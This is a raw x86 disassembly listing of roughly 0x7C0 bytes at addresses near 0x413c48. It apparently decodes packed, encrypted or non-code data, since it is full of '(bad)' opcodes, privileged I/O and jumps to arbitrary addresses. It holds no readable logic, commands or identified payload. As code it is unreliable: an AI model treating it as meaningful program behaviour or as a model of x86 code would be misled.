  413c48:	enter  0xb3c6,0x74
  413c4c:	mov    ds:0xe47f64e4,eax
  413c51:	sbb    ebp,edi
  413c53:	xchg   BYTE PTR [ebx],ch
  413c55:	cld    
  413c56:	adc    al,BYTE PTR [edx]
  413c58:	jecxz  0x413c3c
  413c5a:	punpckhdq mm6,QWORD PTR [esp+eiz*8-0x5a496181]
  413c62:	pusha  
  413c63:	mov    ds:0xb5a56cf7,al
  413c68:	or     BYTE PTR [ebx+edx*8],0xbe
  413c6c:	mov    ecx,0x8828422
  413c71:	pop    eax
  413c72:	test   al,0x84
  413c74:	loop   0x413cd1
  413c76:	sar    BYTE PTR [ebx],1
  413c78:	mov    ebp,0x1276c530
  413c7d:	ins    BYTE PTR es:[edi],dx
  413c7e:	cmp    eax,0x92f36162
  413c83:	test   eax,0x239e1ab8
  413c88:	pop    esp
  413c89:	xchg   BYTE PTR [ebx],bh
  413c8b:	pop    ss
  413c8c:	mov    dh,0x42
  413c8e:	and    DWORD PTR [edx+0x21],0x8016076e
  413c95:	mov    esi,0x65dc606
  413c9a:	hlt    
  413c9b:	(bad)  
  413c9c:	sub    eax,0xa12e715c
  413ca1:	sub    BYTE PTR [eax+0x30c858f9],dh
  413ca7:	pop    eax
  413ca8:	ret    0xfa53
  413cab:	lods   al,BYTE PTR ds:[esi]
  413cac:	fwait
  413cad:	lahf   
  413cae:	or     al,0x38
  413cb0:	rcr    edi,1
  413cb2:	pop    es
  413cb3:	push   ebp
  413cb4:	push   0xffffffd4
  413cb6:	xchg   esi,eax
  413cb7:	cmp    BYTE PTR [eax-0x7f473038],bh
  413cbd:	in     al,0x1e
  413cbf:	sar    BYTE PTR [ebp+0x5bd33cd],1
  413cc5:	hlt    
  413cc6:	cmp    eax,0x63b7e142
  413ccb:	push   esi
  413ccc:	inc    esp
  413ccd:	fwait
  413cce:	pop    esp
  413ccf:	fcomp  DWORD PTR [edi]
  413cd1:	(bad)  
  413cd2:	fist   DWORD PTR [edi+0x49]
  413cd5:	xor    ebp,ebp
  413cd7:	xor    ebx,DWORD PTR [edx-0x5588219]
  413cdd:	sub    DWORD PTR [ecx-0x7d1bf61d],ecx
  413ce3:	adc    ebp,DWORD PTR [edi]
  413ce5:	cmp    bl,BYTE PTR [ecx+0x65]
  413ce8:	xor    DWORD PTR [esi-0x6d],ebp
  413ceb:	adc    esp,DWORD PTR [edi-0x6e]
  413cee:	leave  
  413cef:	mov    eax,0x9f3dcfbd
  413cf4:	loopne 0x413cbe
  413cf6:	ds dec eax
  413cf8:	pop    eax
  413cf9:	scas   eax,DWORD PTR es:[edi]
  413cfa:	popf   
  413cfb:	sahf   
  413cfc:	in     eax,0x13
  413cfe:	xor    al,0xd0
  413d00:	into   
  413d01:	push   esi
  413d02:	push   edi
  413d03:	adc    eax,0x69d1aea8
  413d08:	stos   BYTE PTR es:[edi],al
  413d09:	(bad)  
  413d0a:	adc    al,0x65
  413d0c:	push   ss
  413d0d:	inc    edi
  413d0e:	je     0x413d72
  413d10:	mov    bl,0x7
  413d12:	outs   dx,BYTE PTR ds:[esi]
  413d13:	scas   eax,DWORD PTR es:[edi]
  413d14:	lock cli 
  413d16:	add    BYTE PTR [ebp+edi*4-0x4e],0xa6
  413d1b:	fcmovnb st,st(3)
  413d1d:	aaa    
  413d1e:	adc    DWORD PTR [esi+eax*4-0xd],edi
  413d22:	(bad)  
  413d23:	repnz retf 
  413d25:	(bad)  
  413d26:	sub    esp,DWORD PTR [edi-0xa]
  413d29:	sub    eax,0xd2772952
  413d2e:	fstp   TBYTE PTR [ebp-0x241a73c6]
  413d34:	imul   ebp,DWORD PTR [ecx-0x7a],0xffffffdf
  413d38:	mov    cl,0xda
  413d3a:	mov    ebx,0x60a7073c
  413d3f:	jnp    0x413d8c
  413d41:	out    dx,al
  413d42:	out    0x68,al
  413d44:	rol    DWORD PTR [eax+ecx*4-0x23de1511],1
  413d4b:	leave  
  413d4c:	(bad)  
  413d4d:	add    eax,0x1fbcf92f
  413d52:	xchg   BYTE PTR [ebp-0x6a],ch
  413d55:	gs jne 0x413d29
  413d58:	int3   
  413d59:	rcl    BYTE PTR [eax+ebp*8-0x28d14795],cl
  413d60:	mov    ebx,0x9ee49466
  413d65:	sbb    eax,0xfdcc564e
  413d6a:	int    0xab
  413d6c:	imul   ecx,esi,0xffffffa5
  413d6f:	jne    0x413de5
  413d71:	cmp    cl,BYTE PTR [eax+0x5]
  413d74:	ja     0x413d2d
  413d76:	xchg   ebp,eax
  413d77:	es xchg ebx,eax
  413d79:	rcl    DWORD PTR [eax],1
  413d7b:	inc    edx
  413d7c:	loop   0x413d7c
  413d7e:	lds    eax,FWORD PTR ds:0xd8268389
  413d84:	xchg   edi,eax
  413d85:	mov    BYTE PTR [edx-0xb],al
  413d88:	cmc    
  413d89:	mov    eax,ds:0xf59f2a5a
  413d8e:	add    al,bh
  413d90:	cdq    
  413d91:	loopne 0x413dd6
  413d93:	inc    eax
  413d94:	cmp    edx,eax
  413d96:	(bad)  
  413d97:	stos   DWORD PTR es:[edi],eax
  413d98:	dec    edi
  413d99:	mov    ah,0xeb
  413d9b:	stos   DWORD PTR es:[edi],eax
  413d9c:	lea    ecx,[ecx+0x7bf917f2]
  413da2:	scas   eax,DWORD PTR es:[edi]
  413da3:	pop    ebp
  413da4:	mov    ds:0xf8691ad2,eax
  413da9:	adc    edi,DWORD PTR [edx]
  413dab:	leave  
  413dac:	xchg   ebx,eax
  413dad:	scas   al,BYTE PTR es:[edi]
  413dae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413daf:	je     0x413dfd
  413db1:	add    al,0x5e
  413db3:	mov    ch,0x26
  413db5:	std    
  413db6:	stc    
  413db7:	pop    edi
  413db8:	mov    DWORD PTR [ecx+edi*1+0xb],esp
  413dbc:	mov    bl,BYTE PTR [eax-0x776a41b4]
  413dc2:	and    al,0xe3
  413dc4:	ds ins DWORD PTR es:[edi],dx
  413dc6:	enter  0x2b46,0xbe
  413dca:	fild   DWORD PTR ds:0xdd1b38d2
  413dd0:	dec    edi
  413dd1:	jmp    0x27b80a85
  413dd6:	rcr    eax,1
  413dd8:	ja     0x413dde
  413dda:	xlat   BYTE PTR ds:[ebx]
  413ddb:	mov    ch,0xe3
  413ddd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413dde:	(bad)  
  413de0:	loop   0x413db4
  413de2:	in     al,dx
  413de3:	jle    0x413dbe
  413de5:	stos   DWORD PTR es:[edi],eax
  413de6:	stc    
  413de7:	pop    ss
  413de8:	call   DWORD PTR [edi-0x76]
  413deb:	jns    0x413e56
  413ded:	xor    ch,BYTE PTR [ecx+0x9d475bc]
  413df3:	rcl    BYTE PTR [edi-0x30e7c42f],1
  413df9:	push   0xac25acb
  413dfe:	scas   al,BYTE PTR es:[edi]
  413dff:	not    BYTE PTR [esi+0x5a799893]
  413e05:	imul   DWORD PTR [ebx-0x159e6979]
  413e0b:	loop   0x413dcf
  413e0d:	daa    
  413e0e:	test   DWORD PTR [ebx],ecx
  413e10:	lahf   
  413e11:	xor    ch,al
  413e13:	mov    edi,0x59166981
  413e18:	jecxz  0x413e91
  413e1a:	mov    dl,0x2
  413e1c:	loope  0x413da8
  413e1e:	lahf   
  413e1f:	repz daa 
  413e21:	call   0x879b098e
  413e26:	xbegin 0xc778b817
  413e2c:	mov    edx,0xcfecdd91
  413e31:	cwde   
  413e32:	pop    esi
  413e33:	xchg   ebx,eax
  413e34:	leave  
  413e35:	into   
  413e36:	add    bl,BYTE PTR [edx]
  413e38:	(bad)  [ebp+0x4]
  413e3b:	mov    bl,0x9d
  413e3d:	(bad)  
  413e3f:	fimul  DWORD PTR [esi+0x3d]
  413e42:	rcl    BYTE PTR [eax+0x7b],cl
  413e45:	ret    0x4fe9
  413e48:	clc    
  413e49:	jne    0x413ec0
  413e4b:	cli    
  413e4c:	jae    0x413e74
  413e4e:	stc    
  413e4f:	fisttp QWORD PTR [eax]
  413e51:	xor    ch,BYTE PTR [esi+0x7c]
  413e54:	sti    
  413e55:	push   cs
  413e56:	ins    BYTE PTR es:[edi],dx
  413e57:	stos   BYTE PTR es:[edi],al
  413e58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e59:	mov    edx,0x92cd380b
  413e5e:	jo     0x413e61
  413e60:	repnz sub eax,0xc3dd49e5
  413e66:	mov    esi,0x2249aada
  413e6b:	sti    
  413e6c:	cmp    edi,0x27
  413e6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e70:	test   eax,0x1e49e257
  413e75:	clc    
  413e76:	jns    0x413e78
  413e78:	jns    0x413e8c
  413e7a:	mov    al,0x5c
  413e7c:	add    al,0x1a
  413e7e:	sbb    edx,DWORD PTR [edx-0x739e7cd4]
  413e84:	xchg   esp,eax
  413e85:	mov    al,ds:0xc07203f9
  413e8a:	inc    eax
  413e8b:	test   al,0xea
  413e8d:	pushf  
  413e8e:	push   esi
  413e8f:	push   cs
  413e90:	or     ch,ch
  413e92:	add    al,0x99
  413e94:	cmp    edi,DWORD PTR [ecx-0x279fe773]
  413e9a:	in     al,0x13
  413e9c:	push   esp
  413e9d:	loopne 0x413ee8
  413e9f:	loop   0x413ef0
  413ea1:	and    eax,0x734d565f
  413ea6:	dec    ecx
  413ea7:	or     dl,BYTE PTR [ebp+edx*2-0x45f5a1fb]
  413eae:	push   edi
  413eaf:	sbb    al,0xf2
  413eb1:	add    al,0x75
  413eb3:	stos   BYTE PTR es:[edi],al
  413eb4:	cmp    DWORD PTR ds:0xcd08b55,ecx
  413eba:	pop    esp
  413ebb:	shr    ecx,1
  413ebd:	mov    edx,0x3f6ecf21
  413ec2:	inc    edx
  413ec3:	jo     0x413eae
  413ec5:	test   DWORD PTR [edx+eax*8],eax
  413ec8:	les    eax,FWORD PTR [edi]
  413eca:	add    BYTE PTR ds:0x1cba38c4,bl
  413ed0:	cmp    bl,al
  413ed2:	and    al,0xe5
  413ed4:	cmp    eax,0xe6a82f69
  413ed9:	lods   eax,DWORD PTR ds:[esi]
  413eda:	mov    esp,0x568ffe52
  413edf:	push   edi
  413ee0:	sub    al,0x95
  413ee2:	sbb    DWORD PTR [edx],ebp
  413ee4:	jmp    0xa8d3c74f
  413ee9:	xor    esi,ebx
  413eeb:	inc    edx
  413eec:	xchg   ecx,eax
  413eed:	mov    DWORD PTR ds:0x17aa5097,edi
  413ef3:	add    al,0x4e
  413ef5:	popf   
  413ef6:	mov    ds:0x8c944f54,eax
  413efb:	dec    edi
  413efc:	popa   
  413efd:	or     al,0x7d
  413eff:	fild   WORD PTR [edx+0x204f499d]
  413f05:	dec    ebx
  413f06:	lods   eax,DWORD PTR ds:[esi]
  413f07:	push   esp
  413f08:	jns    0x413f07
  413f0a:	out    dx,eax
  413f0b:	(bad)  
  413f0c:	fadd   DWORD PTR [ecx]
  413f0e:	add    edi,esp
  413f10:	sbb    eax,DWORD PTR [edi]
  413f12:	int    0x88
  413f14:	das    
  413f15:	add    dh,cl
  413f17:	add    cl,ch
  413f19:	push   cs
  413f1a:	cli    
  413f1b:	or     al,cl
  413f1d:	mov    BYTE PTR [edi+edx*2],0xf0
  413f21:	(bad)  
  413f22:	fcomp  DWORD PTR [ebp-0x58]
  413f25:	or     eax,0xbbdc8713
  413f2a:	(bad)  
  413f2b:	xor    al,BYTE PTR [eax]
  413f2d:	xchg   ebp,eax
  413f2e:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  413f30:	jnp    0x413f76
  413f32:	in     al,dx
  413f33:	xchg   ebx,eax
  413f34:	fwait
  413f35:	jg     0x413ef9
  413f37:	push   esi
  413f38:	int3   
  413f39:	dec    esp
  413f3a:	pop    esi
  413f3b:	xchg   ecx,eax
  413f3c:	mov    eax,ds:0xb1e0769b
  413f41:	adc    edx,ecx
  413f43:	and    eax,edi
  413f45:	mov    ebx,DWORD PTR [ebp+0x65]
  413f48:	ret    0x6c8b
  413f4b:	push   es
  413f4c:	scas   al,BYTE PTR es:[edi]
  413f4d:	outs   dx,BYTE PTR ds:[esi]
  413f4e:	add    ah,ah
  413f50:	iret   
  413f51:	fwait
  413f52:	js     0x413f85
  413f54:	mov    ds:0x46c54c36,eax
  413f59:	mov    dh,0x9f
  413f5b:	xchg   ecx,eax
  413f5c:	addr16 stc 
  413f5e:	data16 aaa 
  413f60:	imul   esi,DWORD PTR [ebx+0x1ef0d2ae],0x45841d2d
  413f6a:	test   al,0x32
  413f6c:	into   
  413f6d:	mov    esp,0x7f6216a9
  413f72:	sub    bh,BYTE PTR [ecx+0x1f]
  413f75:	ret    0x5d99
  413f78:	repz fwait
  413f7a:	test   eax,0x63234a4f
  413f7f:	mov    ah,BYTE PTR [eax-0x1d5db8a0]
  413f85:	rcr    BYTE PTR [esi+edi*2-0x48ce8ae3],0x5f
  413f8d:	push   ecx
  413f8e:	mul    DWORD PTR [esp+esi*2+0x18]
  413f92:	sub    al,0xa9
  413f94:	add    dh,bl
  413f96:	pop    ebx
  413f97:	add    al,0xb1
  413f99:	fldcw  WORD PTR [ebx-0xb6b7720]
  413f9f:	in     al,dx
  413fa0:	mov    dl,0xe4
  413fa2:	pop    eax
  413fa3:	test   eax,0x5fc56751
  413fa8:	jnp    0x414014
  413faa:	jae    0x413f8b
  413fac:	(bad)  
  413fad:	outs   dx,DWORD PTR ds:[esi]
  413fae:	xlat   BYTE PTR ds:[ebx]
  413faf:	sbb    dh,BYTE PTR [edi]
  413fb1:	shl    edi,1
  413fb3:	aaa    
  413fb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fb5:	js     0x413f40
  413fb7:	jle    0x413f6a
  413fb9:	loope  0x414014
  413fbb:	xor    esi,DWORD PTR [ecx+0x4d]
  413fbe:	shl    DWORD PTR [eax-0x1b],0x67
  413fc2:	sbb    BYTE PTR [ebx+0x6f39871d],dh
  413fc8:	adc    DWORD PTR [ebp+ecx*8-0x14],0x2366385
  413fd0:	(bad)  
  413fd1:	xchg   esi,eax
  413fd2:	xchg   DWORD PTR [ebp+0x73],esi
  413fd5:	adc    esi,DWORD PTR [esi]
  413fd7:	mov    ch,0xfe
  413fd9:	(bad)
  413fdc:	mov    al,0x99
  413fde:	cmp    eax,0xda917099
  413fe3:	scas   al,BYTE PTR es:[edi]
  413fe4:	ins    BYTE PTR es:[edi],dx
  413fe5:	sar    ecx,cl
  413fe7:	mov    ebp,gs
  413fe9:	outs   dx,DWORD PTR ds:[esi]
  413fea:	mov    eax,eax
  413fec:	xchg   edi,eax
  413fed:	mov    bh,0x3f
  413fef:	ss dec edx
  413ff1:	push   ebx
  413ff2:	fmul   DWORD PTR [ebp+0x29e31978]
  413ff8:	shl    DWORD PTR [ebp-0x7b],cl
  413ffb:	sbb    DWORD PTR [edx+0x56ef6cdc],ebx
  414001:	jl     0x413fc7
  414003:	pop    ebp
  414004:	in     eax,0x51
  414006:	out    dx,eax
  414007:	sbb    eax,0x86d1598e
  41400c:	(bad)  
  41400d:	xlat   BYTE PTR ds:[ebx]
  41400e:	cld    
  41400f:	out    dx,al
  414010:	mov    al,ds:0xd68d0add
  414015:	clc    
  414016:	sbb    eax,0x9f4bef2c
  41401b:	ficomp DWORD PTR [ecx]
  41401d:	mov    edx,0x3f5a3179
  414022:	out    0x7c,eax
  414024:	pop    ebp
  414025:	leave  
  414026:	jp     0x413fb8
  414028:	jns    0x414023
  41402a:	popf   
  41402b:	xor    eax,0xa6172e6d
  414030:	pusha  
  414031:	arpl   ax,dx
  414033:	sbb    BYTE PTR [ecx-0x5bea435],dl
  414039:	jo     0x414052
  41403b:	xchg   ecx,eax
  41403c:	std    
  41403d:	ins    DWORD PTR es:[edi],dx
  41403e:	jb     0x413fd2
  414040:	es inc esp
  414042:	sub    dh,BYTE PTR ds:0x10efc19
  414048:	fld    TBYTE PTR [eax-0xb]
  41404b:	jg     0x41407b
  41404d:	jle    0x413fe9
  41404f:	aaa    
  414050:	sub    edi,DWORD PTR [ecx]
  414052:	shr    edx,1
  414054:	imul   edx,DWORD PTR [ebx+0x7985f2d9],0x2d
  41405b:	sbb    ecx,ebx
  41405d:	cld    
  41405e:	int3   
  41405f:	sbb    al,0x4c
  414061:	shl    DWORD PTR [edx-0x3],0x90
  414065:	pop    edi
  414066:	inc    ecx
  414067:	mov    ebp,0xf96162c9
  41406c:	jle    0x4140a1
  41406e:	pushf  
  41406f:	xchg   ebp,eax
  414070:	sbb    ebp,ebp
  414072:	xchg   ecx,eax
  414073:	lahf   
  414074:	in     al,0xc4
  414076:	jno    0x41400f
  414078:	pop    esi
  414079:	xor    eax,0xd8db53eb
  41407e:	ret    0xfc4d
  414081:	in     eax,dx
  414082:	jecxz  0x4140c4
  414084:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414085:	cmp    eax,0x860ea553
  41408a:	add    al,0xab
  41408c:	clc    
  41408d:	mov    edx,0xbb1c8dd9
  414092:	xchg   ecx,eax
  414093:	test   eax,0xc7bf5a01
  414098:	push   cs
  414099:	rcr    ecx,cl
  41409b:	dec    edi
  41409c:	jg     0x41408a
  41409e:	pop    ebx
  41409f:	cmp    BYTE PTR [eax+0x59],dl
  4140a2:	das    
  4140a3:	xchg   BYTE PTR [edi-0x6a],al
  4140a6:	rcl    BYTE PTR [edx+0x25],0x31
  4140aa:	repz jmp 0x5f6569b2
  4140b0:	mov    ch,0xc8
  4140b2:	ja     0x4140aa
  4140b4:	adc    BYTE PTR [eax-0x4d],bh
  4140b7:	and    edi,edx
  4140b9:	push   0x38758e51
  4140be:	adc    DWORD PTR [edi-0x60cd7c90],esi
  4140c4:	xlat   BYTE PTR ds:[ebx]
  4140c5:	push   edi
  4140c6:	add    al,0xf8
  4140c8:	sub    edi,edx
  4140ca:	jl     0x41405b
  4140cc:	pop    esi
  4140cd:	imul   ecx,DWORD PTR [esi+0x689adf2e],0x2f
  4140d4:	es test al,0xad
  4140d7:	rcr    BYTE PTR [ebx+0x35ed5002],0x71
  4140de:	mov    esp,0x2c131643
  4140e3:	outs   dx,DWORD PTR ds:[esi]
  4140e4:	mov    ds:0xdc814594,eax
  4140e9:	fnsave [ecx-0x1]
  4140ec:	mov    esp,DWORD PTR [edx]
  4140ee:	jmp    0x414109
  4140f0:	xor    ch,BYTE PTR [ebp+0x5d35b5a1]
  4140f6:	sbb    bl,BYTE PTR [esi]
  4140f8:	fwait
  4140f9:	retf   0xb50d
  4140fc:	call   0x151eff4b
  414101:	dec    edx
  414102:	call   0x61:0xfb022933
  414109:	and    esi,DWORD PTR [ecx+0x4b]
  41410c:	repz hlt 
  41410e:	jge    0x414182
  414110:	pushf  
  414111:	shl    BYTE PTR [edi],0x5c
  414114:	mov    esp,0xdae3c302
  414119:	adc    dl,BYTE PTR [ebp-0x1da339d2]
  41411f:	dec    eax
  414120:	xchg   ebp,eax
  414121:	cmp    BYTE PTR [esi-0x5d],ah
  414124:	shl    DWORD PTR [esi-0x26de39f9],1
  41412a:	scas   eax,DWORD PTR es:[di]
  41412c:	sbb    al,ch
  41412e:	sub    bh,ah
  414130:	(bad)  
  414131:	and    bh,al
  414133:	test   eax,0xf2979eb0
  414138:	iret   
  414139:	jo     0x4140c7
  41413b:	fld    QWORD PTR [esi]
  41413d:	bound  ebp,QWORD PTR [eax+0x55f63ad8]
  414143:	pop    es
  414144:	mov    dh,BYTE PTR [ecx]
  414146:	dec    esi
  414147:	sbb    al,0xd3
  414149:	jp     0x414187
  41414b:	jno    0x414109
  41414d:	adc    esi,DWORD PTR [esi+0x67]
  414150:	adc    eax,0x6bcdfe7f
  414155:	pop    esp
  414156:	sbb    eax,0x1a29ac37
  41415b:	pop    ebp
  41415c:	sbb    eax,0xa8ca79ef
  414161:	push   0x68d12b52
  414166:	adc    eax,0x2beb92ce
  41416b:	pop    ebx
  41416c:	ret    
  41416d:	xchg   ebp,eax
  41416e:	and    DWORD PTR [esi+0x78],0x4ebdf15c
  414175:	sub    al,0x9
  414177:	xchg   ecx,eax
  414178:	mov    eax,0x5659692e
  41417d:	or     BYTE PTR [ebx+0x40915603],0x3a
  414184:	or     eax,0xbc6ca468
  414189:	push   edx
  41418a:	add    al,0x5a
  41418c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41418d:	jmp    0x4141c3
  41418f:	ins    BYTE PTR es:[edi],dx
  414190:	mov    ?,WORD PTR [edx+0x2b]
  414193:	(bad)  
  414194:	fcomip st,st(1)
  414196:	push   ecx
  414197:	sub    esi,DWORD PTR [ecx-0x71c97174]
  41419d:	shr    esp,0x48
  4141a0:	add    eax,0x46e9684d
  4141a5:	push   edi
  4141a6:	scas   al,BYTE PTR es:[edi]
  4141a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4141a8:	pushf  
  4141a9:	mov    ah,0x55
  4141ab:	adc    BYTE PTR [ebx+0x5b57f28c],dl
  4141b1:	test   eax,0x5e7fc2bc
  4141b6:	scas   al,BYTE PTR es:[edi]
  4141b7:	ror    DWORD PTR [esi-0x73],1
  4141ba:	jb     0x4141a7
  4141bc:	icebp  
  4141bd:	ins    BYTE PTR es:[edi],dx
  4141be:	push   ebx
  4141bf:	scas   eax,DWORD PTR es:[edi]
  4141c0:	js     0x41421a
  4141c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4141c3:	sbb    eax,0x50866879
  4141c8:	ret    0xd91
  4141cb:	add    dh,BYTE PTR [edx+0x50]
  4141ce:	push   eax
  4141cf:	das    
  4141d0:	popa   
  4141d1:	jno    0x41421b
  4141d3:	cmp    ch,BYTE PTR [ecx+0x13]
  4141d6:	seta   BYTE PTR [ebx]
  4141d9:	inc    edi
  4141da:	xchg   esi,eax
  4141db:	fcom   QWORD PTR [edi-0x3d]
  4141de:	sub    DWORD PTR [esp+edi*2],edx
  4141e1:	iret   
  4141e2:	bound  esp,QWORD PTR ds:0xc8bb50e4
  4141e8:	sbb    eax,0xdf77363f
  4141ed:	aad    0xa4
  4141ef:	div    DWORD PTR [ebx-0x4fc1664c]
  4141f5:	shl    DWORD PTR [ecx+ebx*4+0x67f3e75e],1
  4141fc:	lods   al,BYTE PTR ds:[esi]
  4141fd:	mov    al,ds:0x51af8cb7
  414202:	inc    edx
  414203:	shr    DWORD PTR [eax+0x40],0xe9
  414207:	push   esp
  414208:	mov    eax,ds:0x8c0d1519
  41420d:	adc    BYTE PTR gs:[esi+0x3ac2ee4f],ah
  414214:	and    ebx,DWORD PTR [eax+0x505bf23e]
  41421a:	inc    edi
  41421b:	xchg   ecx,eax
  41421c:	adc    cl,BYTE PTR [esi-0x55]
  41421f:	push   esi
  414220:	dec    ebp
  414221:	and    edi,DWORD PTR [esi]
  414223:	daa    
  414224:	jecxz  0x4141ba
  414226:	xchg   ecx,eax
  414227:	loopne 0x4141e0
  414229:	pop    edx
  41422a:	(bad)
  41422d:	push   ds
  41422e:	push   edi
  41422f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414230:	call   0x80bb394
  414235:	or     dh,al
  414237:	push   edx
  414238:	sub    ecx,DWORD PTR [ebp-0xf846f3a]
  41423e:	int    0xf0
  414240:	xchg   edx,eax
  414241:	lods   eax,DWORD PTR ds:[esi]
  414242:	in     eax,0xf4
  414244:	mov    ah,BYTE PTR ds:0xd94404b6
  41424a:	stos   DWORD PTR es:[edi],eax
  41424b:	add    al,0xd6
  41424d:	int3   
  41424e:	xor    DWORD PTR ds:0xcfa92e93,edx
  414254:	pop    eax
  414255:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414256:	cli    
  414257:	xchg   ecx,eax
  414258:	mov    edx,0xafa0b2be
  41425d:	dec    edx
  41425e:	jno    0x41423b
  414260:	repz cli 
  414262:	imul   BYTE PTR [ebp+0x41ec0e72]
  414268:	add    al,0x3c
  41426a:	add    al,0xfd
  41426c:	dec    esp
  41426d:	ds mov ebx,0x43bc079a
  414273:	test   BYTE PTR [eax],0x64
  414276:	fnstsw WORD PTR [esi]
  414278:	fwait
  414279:	pop    ds
  41427a:	push   0xffffff83
  41427c:	cmp    BYTE PTR [ebx-0x5170d2a1],bl
  414282:	sbb    DWORD PTR [eax+esi*4+0x5e81b1c1],edx
  414289:	xor    eax,0xf0477b09
  41428e:	pushf  
  41428f:	fs jmp 0x51f91ed3
  414295:	inc    eax
  414296:	repz mov ds:0x1dc4c09,eax
  41429c:	rcl    esp,cl
  41429e:	sbb    BYTE PTR ds:0x873d895d,bl
  4142a4:	std    
  4142a5:	jne    0x41431b
  4142a7:	cwde   
  4142a8:	jnp    0x414264
  4142aa:	add    dh,BYTE PTR [ebp+0x62]
  4142ad:	bnd js 0x41428c
  4142b0:	out    0x91,al
  4142b2:	aad    0x1b
  4142b4:	push   ecx
  4142b5:	out    0x92,eax
  4142b7:	shr    DWORD PTR [esi],1
  4142b9:	mov    al,0x47
  4142bb:	fs not edx
  4142be:	jp     0x41425a
  4142c0:	push   0xd
  4142c2:	jb     0x4142d1
  4142c4:	sbb    DWORD PTR [esi+ecx*8],0xffffffaa
  4142c8:	bound  esp,QWORD PTR [ecx-0x793828d4]
  4142ce:	(bad)  
  4142cf:	loopne 0x414271
  4142d1:	loope  0x414256
  4142d3:	xor    edx,DWORD PTR ds:0x2831d1b4
  4142d9:	das    
  4142da:	jp     0x4142e8
  4142dc:	lds    ecx,FWORD PTR [ebx+0xc]
  4142df:	add    eax,ebp
  4142e1:	push   ss
  4142e2:	jo     0x4142ba
  4142e4:	(bad)  
  4142e6:	dec    ebx
  4142e7:	jmp    0x4142ec
  4142e9:	mov    edi,0x269f45fb
  4142ee:	sti    
  4142ef:	pusha  
  4142f0:	imul   DWORD PTR [esi]
  4142f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142f3:	and    al,0x9a
  4142f5:	cld    
  4142f6:	add    ah,BYTE PTR [ebx*1-0x7d112596]
  4142fd:	inc    ebx
  4142fe:	repz add al,0xb0
  414301:	mov    eax,0x87fc6b50
  414306:	(bad)  
  414307:	dec    DWORD PTR [edx]
  414309:	repz shr DWORD PTR [esi-0x2c197fc],0x89
  414311:	sahf   
  414312:	push   ecx
  414313:	and    eax,0xc37f2cc
  414318:	push   ebx
  414319:	jp     0x4142f0
  41431b:	mov    BYTE PTR [edx-0x1e],cl
  41431e:	jbe    0x4142b0
  414320:	mov    al,ds:0xf095babe
  414325:	inc    edx
  414326:	jo     0x41431e
  414328:	sub    al,0xa1
  41432a:	ret    
  41432b:	leave  
  41432c:	pop    ds
  41432d:	or     bh,BYTE PTR ds:0x4305038c
  414333:	mov    ss:0xe459fb63,al
  414339:	loope  0x4142fc
  41433b:	int3   
  41433c:	cmp    ecx,DWORD PTR [edx+0x26]
  41433f:	or     eax,0x5f9385e4
  414344:	int    0xcf
  414346:	push   ebp
  414347:	dec    esp
  414348:	(bad)  
  414349:	xlat   BYTE PTR ds:[ebx]
  41434a:	push   ecx
  41434b:	jl     0x4142fc
  41434d:	xor    cl,bh
  41434f:	mov    al,BYTE PTR [ecx+0x15]
  414352:	jg     0x414326
  414354:	pop    ebx
  414355:	jno    0x4142e4
  414357:	jo     0x414340
  414359:	popa   
  41435a:	inc    BYTE PTR [eax]
  41435c:	imul   ebx,DWORD PTR [ebx-0x6287c536],0x72c8dedd
  414366:	scas   al,BYTE PTR es:[edi]
  414367:	bound  ebp,QWORD PTR [esi+0x3a7fa05e]
  41436d:	aaa    
  41436e:	pusha  
  41436f:	xchg   DWORD PTR ds:0x45af0313,ebp
  414375:	int    0xf
  414377:	ins    DWORD PTR es:[edi],dx
  414378:	(bad)  
  414379:	or     ecx,DWORD PTR [ecx-0x4d6289ff]
  41437f:	jmp    0xc639:0xf75e984
  414386:	outs   dx,DWORD PTR ds:[esi]
  414387:	jge    0x4143d1
  414389:	cld    
  41438a:	xor    al,0xd6
  41438c:	pop    ss
  41438d:	in     eax,0x9
  41438f:	data16 int3 
  414391:	mov    bl,dh
  414393:	mov    bh,0x1c
  414395:	popf   
  414396:	ins    BYTE PTR es:[edi],dx
  414397:	push   esi
  414398:	fdivr  st,st(5)
  41439a:	popa   
  41439b:	mov    DWORD PTR [eax-0x7f],0xddb39e65
  4143a2:	xchg   esi,eax
  4143a3:	in     al,0x70
  4143a5:	retf   
  4143a6:	mov    ah,0x3d
  4143a8:	rcl    ebp,cl
  4143aa:	xchg   ebp,eax
  4143ab:	sub    BYTE PTR [ecx-0x6f9ab8fa],0xee
  4143b2:	pop    ss
  4143b3:	hlt    
  4143b4:	int3   
  4143b5:	ret    0xf879
  4143b8:	rcpps  xmm1,XMMWORD PTR [ebp+ebp*4+0x6eccf574]
  4143c0:	lahf   
  4143c1:	mov    ?,WORD PTR ds:0x825f8ede
  4143c7:	xchg   esp,eax
  4143c8:	lea    eax,[edx-0x7c884ade]
  4143ce:	test   al,0xe7
  4143d0:	popf   
  4143d1:	sub    ebp,DWORD PTR [esi+0x6485a22e]
  4143d7:	cdq    
  4143d8:	mov    dl,bh
  4143da:	push   esp
  4143db:	xlat   BYTE PTR ds:[ebx]
  4143dc:	dec    ecx
  4143dd:	push   esp
  4143de:	sbb    DWORD PTR [esi-0x12],eax
  4143e1:	out    dx,eax
  4143e2:	test   al,0xe8
  4143e4:	dec    edx
  4143e5:	fdiv   QWORD PTR [esp+eiz*2-0x41]
  4143e9:	test   DWORD PTR [edx],edi
  4143eb:	pusha  
  4143ec:	hlt    
  4143ed:	icebp  
  4143ee:	imul   edi,DWORD PTR [esi],0xfb7b4965
  4143f4:	mov    dh,0xd4
  4143f6:	jmp    0x1c33:0xbbbb7600
  4143fd:	sub    eax,0x541e89e7
  414402:	xchg   ebx,eax
  414403:	sar    BYTE PTR ds:0xb86c3bc5,0x19
